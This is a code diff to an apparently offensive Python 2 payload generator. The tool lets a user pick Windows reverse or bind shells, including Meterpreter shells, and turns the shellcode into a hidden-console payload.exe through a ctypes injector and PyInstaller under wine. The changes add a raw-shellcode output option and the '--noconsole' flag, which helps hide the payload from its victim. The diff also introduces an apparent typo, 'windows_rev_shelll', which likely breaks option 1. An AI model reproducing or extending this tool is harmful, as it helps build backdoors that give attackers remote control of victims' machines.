@@ -181,11 +181,11 @@ print "   /____/".center(t.width)
 print t.normal + '=' * t.width
 
 try:
-    print '[1] Windows Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Placeholder'.center(t.width)
+    print '[1] Windows Stageless Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width)
     print '=' * t.width
     menuchoice = raw_input('> ')
     if menuchoice == '1':
-        payloadchoice = windows_rev_shell
+        payloadchoice = windows_rev_shelll
         payload = 'Windows Reverse Shell'
     elif menuchoice == '2':
         payloadchoice = windows_met_rev_shell
@@ -194,8 +194,8 @@ try:
         payloadchoice = windows_met_bind_shell
         payload = 'Windows Meterpreter Bind Shell'
     elif menuchoice == '4':
-        payloadchoice = linux_x86_met_rev_shell
-        payload = 'Placeholder '
+        payloadchoice = windows_met_rev_shell
+        payload = 'Windows Meterpreter Reverse Raw '
     else:
         print t.bold_red + '[*] Wrong Selection' + t.normal
         sys.exit(1)
@@ -229,11 +229,16 @@ try:
         bindporthex = struct.pack('>h', int(bindport))
         shellcode = payloadchoice % (bindporthex)
 
+    for byte in shellcode:
+        ez2read_shellcode += '\\x%s' % byte.encode('hex')
+
+    if menuchoice == '4':
+        print '=' * int((t.width / 2)-5) + 'SHELLCODE' + '=' * int((t.width / 2)-4) + '\n' + ez2read_shellcode + '\n' + '=' * t.width
+        sys.exit(0)
+
     want_to_payloadinexe = raw_input(
         '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ')
 
-    for byte in shellcode:
-        ez2read_shellcode += '\\x%s' % byte.encode('hex')
 
     injectwindows = """#/usr/bin/python
 import ctypes
@@ -254,7 +259,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         print '[*] Creating Payload.exe From Payload.py...'
 
         subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                         '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         print '[*] Cleaning Up...'
         os.system('mv %s/dist/payload.exe %s/payload.exe' %
                   (payloaddir, payloaddir))
